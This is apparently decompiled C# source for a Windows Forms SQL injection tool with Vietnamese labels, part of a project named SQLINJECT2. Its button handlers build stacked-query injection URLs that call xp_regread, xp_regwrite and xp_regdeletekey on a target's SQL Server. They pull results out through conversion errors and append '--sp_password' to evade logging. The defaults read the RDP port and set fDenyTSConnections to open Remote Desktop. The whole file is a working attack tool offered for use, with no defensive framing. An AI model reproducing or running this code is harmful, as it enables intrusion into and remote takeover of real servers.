using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net;
using System.Windows.Forms;

namespace SQLINJECT2;

public class RegistryForm : Form
{
	private IContainer components = null;

	private TabControl tabControl1;

	private TabPage tabPage1;

	private TabPage tabPage2;

	private Button button3;

	private Button button2;

	private Button button1;

	private TextBox textBox4;

	private TextBox textBox3;

	private TextBox textBox2;

	private TextBox textBox1;

	private Label label4;

	private Label label3;

	private Label label2;

	private Label label1;

	private Label label9;

	private Label label8;

	private Label label7;

	private Label label6;

	private Label label5;

	private Button button6;

	private Button button5;

	private Button button4;

	private ComboBox comboBox1;

	private TextBox textBox8;

	private TextBox textBox7;

	private TextBox textBox6;

	private TextBox textBox5;

	private TabPage tabPage3;

	private Button button9;

	private Button button8;

	private Button button7;

	private TextBox textBox10;

	private TextBox textBox9;

	private Label label11;

	private Label label10;

	private string weblink;

	private string thongbao1 = "value '";

	private string thongbao2 = "' to";

	private string thongbao1_2 = "value &apos;";

	private string thongbao2_2 = "&apos; to";

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected O, but got Unknown
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Expected O, but got Unknown
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ec: Expected O, but got Unknown
		//IL_00ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f7: Expected O, but got Unknown
		//IL_00f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0102: Expected O, but got Unknown
		//IL_0103: Unknown result type (might be due to invalid IL or missing references)
		//IL_010d: Expected O, but got Unknown
		//IL_010e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0118: Expected O, but got Unknown
		//IL_0119: Unknown result type (might be due to invalid IL or missing references)
		//IL_0123: Expected O, but got Unknown
		//IL_0124: Unknown result type (might be due to invalid IL or missing references)
		//IL_012e: Expected O, but got Unknown
		//IL_012f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0139: Expected O, but got Unknown
		//IL_013a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0144: Expected O, but got Unknown
		//IL_0145: Unknown result type (might be due to invalid IL or missing references)
		//IL_014f: Expected O, but got Unknown
		//IL_0150: Unknown result type (might be due to invalid IL or missing references)
		//IL_015a: Expected O, but got Unknown
		//IL_015b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0165: Expected O, but got Unknown
		//IL_0166: Unknown result type (might be due to invalid IL or missing references)
		//IL_0170: Expected O, but got Unknown
		//IL_0171: Unknown result type (might be due to invalid IL or missing references)
		//IL_017b: Expected O, but got Unknown
		//IL_017c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0186: Expected O, but got Unknown
		//IL_0187: Unknown result type (might be due to invalid IL or missing references)
		//IL_0191: Expected O, but got Unknown
		//IL_0381: Unknown result type (might be due to invalid IL or missing references)
		//IL_054e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0558: Expected O, but got Unknown
		//IL_06d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_06da: Expected O, but got Unknown
		//IL_0750: Unknown result type (might be due to invalid IL or missing references)
		//IL_075a: Expected O, but got Unknown
		//IL_07d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_07da: Expected O, but got Unknown
		//IL_0850: Unknown result type (might be due to invalid IL or missing references)
		//IL_085a: Expected O, but got Unknown
		//IL_09f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0dc9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0dd3: Expected O, but got Unknown
		//IL_0e49: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e53: Expected O, but got Unknown
		//IL_0ec9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ed3: Expected O, but got Unknown
		//IL_0f49: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f53: Expected O, but got Unknown
		//IL_0fc9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fd3: Expected O, but got Unknown
		//IL_10ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_134d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1357: Expected O, but got Unknown
		//IL_13cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_13d7: Expected O, but got Unknown
		//IL_1478: Unknown result type (might be due to invalid IL or missing references)
		//IL_1482: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(RegistryForm));
		tabControl1 = new TabControl();
		tabPage1 = new TabPage();
		button3 = new Button();
		button2 = new Button();
		button1 = new Button();
		textBox4 = new TextBox();
		textBox3 = new TextBox();
		textBox2 = new TextBox();
		textBox1 = new TextBox();
		label4 = new Label();
		label3 = new Label();
		label2 = new Label();
		label1 = new Label();
		tabPage2 = new TabPage();
		button6 = new Button();
		button5 = new Button();
		button4 = new Button();
		comboBox1 = new ComboBox();
		textBox8 = new TextBox();
		textBox7 = new TextBox();
		textBox6 = new TextBox();
		textBox5 = new TextBox();
		label9 = new Label();
		label8 = new Label();
		label7 = new Label();
		label6 = new Label();
		label5 = new Label();
		tabPage3 = new TabPage();
		button9 = new Button();
		button8 = new Button();
		button7 = new Button();
		textBox10 = new TextBox();
		textBox9 = new TextBox();
		label11 = new Label();
		label10 = new Label();
		((Control)tabControl1).SuspendLayout();
		((Control)tabPage1).SuspendLayout();
		((Control)tabPage2).SuspendLayout();
		((Control)tabPage3).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)tabControl1).get_Controls().Add((Control)(object)tabPage1);
		((Control)tabControl1).get_Controls().Add((Control)(object)tabPage2);
		((Control)tabControl1).get_Controls().Add((Control)(object)tabPage3);
		((Control)tabControl1).set_Dock((DockStyle)5);
		((Control)tabControl1).set_Location(new Point(0, 0));
		((Control)tabControl1).set_Name("tabControl1");
		tabControl1.set_SelectedIndex(0);
		((Control)tabControl1).set_Size(new Size(292, 180));
		((Control)tabControl1).set_TabIndex(0);
		((Control)tabPage1).get_Controls().Add((Control)(object)button3);
		((Control)tabPage1).get_Controls().Add((Control)(object)button2);
		((Control)tabPage1).get_Controls().Add((Control)(object)button1);
		((Control)tabPage1).get_Controls().Add((Control)(object)textBox4);
		((Control)tabPage1).get_Controls().Add((Control)(object)textBox3);
		((Control)tabPage1).get_Controls().Add((Control)(object)textBox2);
		((Control)tabPage1).get_Controls().Add((Control)(object)textBox1);
		((Control)tabPage1).get_Controls().Add((Control)(object)label4);
		((Control)tabPage1).get_Controls().Add((Control)(object)label3);
		((Control)tabPage1).get_Controls().Add((Control)(object)label2);
		((Control)tabPage1).get_Controls().Add((Control)(object)label1);
		tabPage1.set_Location(new Point(4, 22));
		((Control)tabPage1).set_Name("tabPage1");
		((Control)tabPage1).set_Padding(new Padding(3));
		((Control)tabPage1).set_Size(new Size(284, 154));
		tabPage1.set_TabIndex(0);
		((Control)tabPage1).set_Text("Đọc khóa");
		tabPage1.set_UseVisualStyleBackColor(true);
		((Control)button3).set_Location(new Point(9, 124));
		((Control)button3).set_Name("button3");
		((Control)button3).set_Size(new Size(75, 23));
		((Control)button3).set_TabIndex(10);
		((Control)button3).set_Text("Đọc khóa");
		((ButtonBase)button3).set_UseVisualStyleBackColor(true);
		((Control)button3).add_Click((EventHandler)button3_Click);
		((Control)button2).set_Location(new Point(203, 124));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(75, 23));
		((Control)button2).set_TabIndex(9);
		((Control)button2).set_Text("Close");
		((ButtonBase)button2).set_UseVisualStyleBackColor(true);
		((Control)button2).add_Click((EventHandler)button2_Click);
		((Control)button1).set_Location(new Point(107, 124));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(75, 23));
		((Control)button1).set_TabIndex(8);
		((Control)button1).set_Text("Reset");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)textBox4).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)163));
		((Control)textBox4).set_Location(new Point(80, 83));
		((Control)textBox4).set_Name("textBox4");
		((TextBoxBase)textBox4).set_ReadOnly(true);
		((Control)textBox4).set_Size(new Size(99, 20));
		((Control)textBox4).set_TabIndex(7);
		((Control)textBox3).set_Location(new Point(80, 59));
		((Control)textBox3).set_Name("textBox3");
		((Control)textBox3).set_Size(new Size(198, 20));
		((Control)textBox3).set_TabIndex(6);
		((Control)textBox3).set_Text("PortNumber");
		((Control)textBox2).set_Location(new Point(80, 35));
		((Control)textBox2).set_Name("textBox2");
		((Control)textBox2).set_Size(new Size(198, 20));
		((Control)textBox2).set_TabIndex(5);
		((Control)textBox2).set_Text("System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\\");
		((Control)textBox1).set_Location(new Point(80, 11));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(198, 20));
		((Control)textBox1).set_TabIndex(4);
		((Control)textBox1).set_Text("HKEY_LOCAL_MACHINE");
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)163));
		((Control)label4).set_Location(new Point(6, 90));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(47, 13));
		((Control)label4).set_TabIndex(3);
		((Control)label4).set_Text("Value :");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)163));
		((Control)label3).set_Location(new Point(6, 66));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(36, 13));
		((Control)label3).set_TabIndex(2);
		((Control)label3).set_Text("Key :");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)163));
		((Control)label2).set_Location(new Point(6, 43));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(62, 13));
		((Control)label2).set_TabIndex(1);
		((Control)label2).set_Text("Sub Key :");
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)163));
		((Control)label1).set_Location(new Point(6, 19));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(67, 13));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("Root Key :");
		((Control)tabPage2).get_Controls().Add((Control)(object)button6);
		((Control)tabPage2).get_Controls().Add((Control)(object)button5);
		((Control)tabPage2).get_Controls().Add((Control)(object)button4);
		((Control)tabPage2).get_Controls().Add((Control)(object)comboBox1);
		((Control)tabPage2).get_Controls().Add((Control)(object)textBox8);
		((Control)tabPage2).get_Controls().Add((Control)(object)textBox7);
		((Control)tabPage2).get_Controls().Add((Control)(object)textBox6);
		((Control)tabPage2).get_Controls().Add((Control)(object)textBox5);
		((Control)tabPage2).get_Controls().Add((Control)(object)label9);
		((Control)tabPage2).get_Controls().Add((Control)(object)label8);
		((Control)tabPage2).get_Controls().Add((Control)(object)label7);
		((Control)tabPage2).get_Controls().Add((Control)(object)label6);
		((Control)tabPage2).get_Controls().Add((Control)(object)label5);
		tabPage2.set_Location(new Point(4, 22));
		((Control)tabPage2).set_Name("tabPage2");
		((Control)tabPage2).set_Padding(new Padding(3));
		((Control)tabPage2).set_Size(new Size(284, 154));
		tabPage2.set_TabIndex(1);
		((Control)tabPage2).set_Text("Tạo mới/Sửa khóa");
		tabPage2.set_UseVisualStyleBackColor(true);
		((Control)button6).set_Location(new Point(203, 125));
		((Control)button6).set_Name("button6");
		((Control)button6).set_Size(new Size(75, 23));
		((Control)button6).set_TabIndex(12);
		((Control)button6).set_Text("Close");
		((ButtonBase)button6).set_UseVisualStyleBackColor(true);
		((Control)button6).add_Click((EventHandler)button6_Click);
		((Control)button5).set_Location(new Point(106, 125));
		((Control)button5).set_Name("button5");
		((Control)button5).set_Size(new Size(75, 23));
		((Control)button5).set_TabIndex(11);
		((Control)button5).set_Text("Reset");
		((ButtonBase)button5).set_UseVisualStyleBackColor(true);
		((Control)button5).add_Click((EventHandler)button5_Click);
		((Control)button4).set_Location(new Point(9, 125));
		((Control)button4).set_Name("button4");
		((Control)button4).set_Size(new Size(75, 23));
		((Control)button4).set_TabIndex(10);
		((Control)button4).set_Text("Tạo/Sửa");
		((ButtonBase)button4).set_UseVisualStyleBackColor(true);
		((Control)button4).add_Click((EventHandler)button4_Click);
		((ListControl)comboBox1).set_FormattingEnabled(true);
		comboBox1.get_Items().AddRange(new object[5] { "REG_DWORD", "REG_SZ", "REG_BINARY", "REG_MULTI_SZ", "REG_EXPAND_SZ" });
		((Control)comboBox1).set_Location(new Point(79, 75));
		((Control)comboBox1).set_Name("comboBox1");
		((Control)comboBox1).set_Size(new Size(121, 21));
		((Control)comboBox1).set_TabIndex(9);
		((Control)comboBox1).set_Text("REG_DWORD");
		((Control)textBox8).set_Location(new Point(79, 98));
		((Control)textBox8).set_Name("textBox8");
		((Control)textBox8).set_Size(new Size(100, 20));
		((Control)textBox8).set_TabIndex(8);
		((Control)textBox8).set_Text("1");
		((Control)textBox7).set_Location(new Point(79, 53));
		((Control)textBox7).set_Name("textBox7");
		((Control)textBox7).set_Size(new Size(199, 20));
		((Control)textBox7).set_TabIndex(7);
		((Control)textBox7).set_Text("fDenyTSConnections");
		((Control)textBox6).set_Location(new Point(79, 31));
		((Control)textBox6).set_Name("textBox6");
		((Control)textBox6).set_Size(new Size(199, 20));
		((Control)textBox6).set_TabIndex(6);
		((Control)textBox6).set_Text("SYSTEM\\CurrentControlSet\\Control\\Terminal Server");
		((Control)textBox5).set_Location(new Point(79, 9));
		((Control)textBox5).set_Name("textBox5");
		((Control)textBox5).set_Size(new Size(199, 20));
		((Control)textBox5).set_TabIndex(5);
		((Control)textBox5).set_Text("HKEY_LOCAL_MACHINE");
		((Control)label9).set_AutoSize(true);
		((Control)label9).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)163));
		((Control)label9).set_Location(new Point(6, 105));
		((Control)label9).set_Name("label9");
		((Control)label9).set_Size(new Size(47, 13));
		((Control)label9).set_TabIndex(4);
		((Control)label9).set_Text("Value :");
		((Control)label8).set_AutoSize(true);
		((Control)label8).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)163));
		((Control)label8).set_Location(new Point(6, 83));
		((Control)label8).set_Name("label8");
		((Control)label8).set_Size(new Size(43, 13));
		((Control)label8).set_TabIndex(3);
		((Control)label8).set_Text("Type :");
		((Control)label7).set_AutoSize(true);
		((Control)label7).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)163));
		((Control)label7).set_Location(new Point(6, 61));
		((Control)label7).set_Name("label7");
		((Control)label7).set_Size(new Size(36, 13));
		((Control)label7).set_TabIndex(2);
		((Control)label7).set_Text("Key :");
		((Control)label6).set_AutoSize(true);
		((Control)label6).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)163));
		((Control)label6).set_Location(new Point(6, 39));
		((Control)label6).set_Name("label6");
		((Control)label6).set_Size(new Size(62, 13));
		((Control)label6).set_TabIndex(1);
		((Control)label6).set_Text("Sub Key :");
		((Control)label5).set_AutoSize(true);
		((Control)label5).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)163));
		((Control)label5).set_Location(new Point(6, 17));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(66, 13));
		((Control)label5).set_TabIndex(0);
		((Control)label5).set_Text("Root key :");
		((Control)tabPage3).get_Controls().Add((Control)(object)button9);
		((Control)tabPage3).get_Controls().Add((Control)(object)button8);
		((Control)tabPage3).get_Controls().Add((Control)(object)button7);
		((Control)tabPage3).get_Controls().Add((Control)(object)textBox10);
		((Control)tabPage3).get_Controls().Add((Control)(object)textBox9);
		((Control)tabPage3).get_Controls().Add((Control)(object)label11);
		((Control)tabPage3).get_Controls().Add((Control)(object)label10);
		tabPage3.set_Location(new Point(4, 22));
		((Control)tabPage3).set_Name("tabPage3");
		((Control)tabPage3).set_Padding(new Padding(3));
		((Control)tabPage3).set_Size(new Size(284, 154));
		tabPage3.set_TabIndex(2);
		((Control)tabPage3).set_Text("Xóa Khóa");
		tabPage3.set_UseVisualStyleBackColor(true);
		((Control)button9).set_Location(new Point(201, 81));
		((Control)button9).set_Name("button9");
		((Control)button9).set_Size(new Size(75, 23));
		((Control)button9).set_TabIndex(6);
		((Control)button9).set_Text("Close");
		((ButtonBase)button9).set_UseVisualStyleBackColor(true);
		((Control)button9).add_Click((EventHandler)button9_Click);
		((Control)button8).set_Location(new Point(103, 81));
		((Control)button8).set_Name("button8");
		((Control)button8).set_Size(new Size(75, 23));
		((Control)button8).set_TabIndex(5);
		((Control)button8).set_Text("Reset");
		((ButtonBase)button8).set_UseVisualStyleBackColor(true);
		((Control)button8).add_Click((EventHandler)button8_Click);
		((Control)button7).set_Location(new Point(7, 82));
		((Control)button7).set_Name("button7");
		((Control)button7).set_Size(new Size(75, 23));
		((Control)button7).set_TabIndex(4);
		((Control)button7).set_Text("Xóa");
		((ButtonBase)button7).set_UseVisualStyleBackColor(true);
		((Control)button7).add_Click((EventHandler)button7_Click);
		((Control)textBox10).set_Location(new Point(77, 28));
		((Control)textBox10).set_Name("textBox10");
		((Control)textBox10).set_Size(new Size(199, 20));
		((Control)textBox10).set_TabIndex(3);
		((Control)textBox9).set_Location(new Point(77, 6));
		((Control)textBox9).set_Name("textBox9");
		((Control)textBox9).set_Size(new Size(199, 20));
		((Control)textBox9).set_TabIndex(2);
		((Control)label11).set_AutoSize(true);
		((Control)label11).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)163));
		((Control)label11).set_Location(new Point(4, 36));
		((Control)label11).set_Name("label11");
		((Control)label11).set_Size(new Size(36, 13));
		((Control)label11).set_TabIndex(1);
		((Control)label11).set_Text("Key :");
		((Control)label10).set_AutoSize(true);
		((Control)label10).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)163));
		((Control)label10).set_Location(new Point(3, 14));
		((Control)label10).set_Name("label10");
		((Control)label10).set_Size(new Size(67, 13));
		((Control)label10).set_TabIndex(0);
		((Control)label10).set_Text("Root Key :");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(292, 180));
		((Control)this).get_Controls().Add((Control)(object)tabControl1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_MaximumSize(new Size(300, 207));
		((Control)this).set_MinimumSize(new Size(300, 207));
		((Control)this).set_Name("RegistryForm");
		((Control)this).set_Text("Tương Tác Với Registry Server");
		((Control)tabControl1).ResumeLayout(false);
		((Control)tabPage1).ResumeLayout(false);
		((Control)tabPage1).PerformLayout();
		((Control)tabPage2).ResumeLayout(false);
		((Control)tabPage2).PerformLayout();
		((Control)tabPage3).ResumeLayout(false);
		((Control)tabPage3).PerformLayout();
		((Control)this).ResumeLayout(false);
	}

	public RegistryForm()
	{
		InitializeComponent();
	}

	private bool GetHtmlSource(out string responseString, Uri requestURI)
	{
		HttpWebResponse httpWebResponse = null;
		WebProxy proxy = null;
		Stream stream = null;
		MemoryStream memoryStream = null;
		MemoryStream memoryStream2 = null;
		bool result = false;
		responseString = "";
		requestURI = null;
		try
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(weblink);
			httpWebRequest.Accept = "*/*";
			httpWebRequest.Headers.Add("Accept-Language", "en-us");
			httpWebRequest.UserAgent = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.7) Gecko/20050414 Firefox/1.0.3";
			httpWebRequest.Method = "GET";
			httpWebRequest.AllowAutoRedirect = true;
			httpWebRequest.Proxy = proxy;
			httpWebRequest.Timeout = (int)new TimeSpan(0, 0, 60).TotalMilliseconds;
			try
			{
				httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
				_ = httpWebResponse.CharacterSet;
				stream = httpWebResponse.GetResponseStream();
				result = true;
			}
			catch (WebException ex)
			{
				result = false;
				if (ex.Response == null)
				{
					stream = null;
					responseString = "<html><body>" + ex.Message + "</body></html>";
					return result;
				}
				stream = ex.Response!.GetResponseStream();
			}
			finally
			{
				requestURI = httpWebRequest.RequestUri;
			}
			if (stream != null)
			{
				memoryStream = new MemoryStream();
				memoryStream2 = new MemoryStream();
				Utilities.CopyStream(stream, memoryStream);
				memoryStream.Position = 0L;
				Utilities.CopyStream(memoryStream, memoryStream2);
				responseString = Utilities.GetStreamHTMLData(memoryStream, null, supportSeek: true);
			}
			return result;
		}
		catch (Exception)
		{
			return result;
		}
		finally
		{
			stream?.Close();
			memoryStream?.Close();
			memoryStream2?.Close();
		}
	}

	private void button1_Click(object sender, EventArgs e)
	{
		((Control)textBox1).set_Text("");
		((Control)textBox2).set_Text("");
		((Control)textBox3).set_Text("");
		((Control)textBox4).set_Text("");
	}

	private void button2_Click(object sender, EventArgs e)
	{
		((Form)this).Close();
	}

	private void button3_Click(object sender, EventArgs e)
	{
		//IL_0050: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)textBox1).get_Text() == "" || ((Control)textBox2).get_Text() == "" || ((Control)textBox3).get_Text() == "")
		{
			MessageBox.Show("Bạn chưa điền đủ thông tin");
			return;
		}
		LoadForm loadForm = new LoadForm();
		((Control)loadForm).Show();
		Uri requestURI = null;
		string responseString = "";
		weblink = MainForm.address1 + ";drop table millkak create table millkak (id int identity,noi_dung1 varchar(99), noi_dung2 varchar(99)) insert into millkak EXEC master..xp_regread '" + ((Control)textBox1).get_Text() + "','" + ((Control)textBox2).get_Text() + "','" + ((Control)textBox3).get_Text() + "'--sp_password" + MainForm.address2;
		GetHtmlSource(out responseString, requestURI);
		requestURI = null;
		responseString = "";
		weblink = MainForm.address1 + " and 1=convert(int,(select top 1 noi_dung1%2b'/'%2bnoi_dung2 from millkak where id=1))--sp_password" + MainForm.address2;
		GetHtmlSource(out responseString, requestURI);
		int num = Convert.ToInt32(responseString.IndexOf(thongbao1)) + 7;
		int length = Convert.ToInt32(responseString.IndexOf(thongbao2)) - num;
		if (num == 6)
		{
			num = Convert.ToInt32(responseString.IndexOf(thongbao1_2)) + 12;
			length = Convert.ToInt32(responseString.IndexOf(thongbao2_2)) - num;
		}
		string[] array = responseString.Substring(num, length).Split(new char[1] { '/' });
		((Control)textBox4).set_Text(array[1]);
		MainForm.load = 1;
	}

	private void button6_Click(object sender, EventArgs e)
	{
		((Form)this).Close();
	}

	private void button5_Click(object sender, EventArgs e)
	{
		((Control)textBox5).set_Text("");
		((Control)textBox6).set_Text("");
		((Control)textBox7).set_Text("");
		((Control)textBox8).set_Text("");
	}

	private void button4_Click(object sender, EventArgs e)
	{
		//IL_0067: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)textBox5).get_Text() == "" || ((Control)textBox6).get_Text() == "" || ((Control)textBox7).get_Text() == "" || ((Control)textBox8).get_Text() == "")
		{
			MessageBox.Show("Bạn chưa điền đủ thông tin");
			return;
		}
		LoadForm loadForm = new LoadForm();
		((Control)loadForm).Show();
		Uri requestURI = null;
		string responseString = "";
		weblink = MainForm.address1 + ";exec master..xp_regwrite " + ((Control)textBox5).get_Text() + ",'" + ((Control)textBox6).get_Text() + "','" + ((Control)textBox7).get_Text() + "'," + ((Control)comboBox1).get_Text() + "," + ((Control)textBox8).get_Text() + "--sp_password" + MainForm.address2;
		GetHtmlSource(out responseString, requestURI);
		MainForm.load = 1;
	}

	private void button9_Click(object sender, EventArgs e)
	{
		((Form)this).Close();
	}

	private void button8_Click(object sender, EventArgs e)
	{
		((Control)textBox9).set_Text("");
		((Control)textBox10).set_Text("");
	}

	private void button7_Click(object sender, EventArgs e)
	{
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)textBox9).get_Text() == "" || ((Control)textBox10).get_Text() == "")
		{
			MessageBox.Show("Bạn phải điền đủ thông tin");
			return;
		}
		LoadForm loadForm = new LoadForm();
		((Control)loadForm).Show();
		Uri requestURI = null;
		string responseString = "";
		weblink = MainForm.address1 + ";exec xp_regdeletekey '" + ((Control)textBox9).get_Text() + "', '" + ((Control)textBox10).get_Text() + "'--sp_password" + MainForm.address2;
		GetHtmlSource(out responseString, requestURI);
		MainForm.load = 1;
	}
}
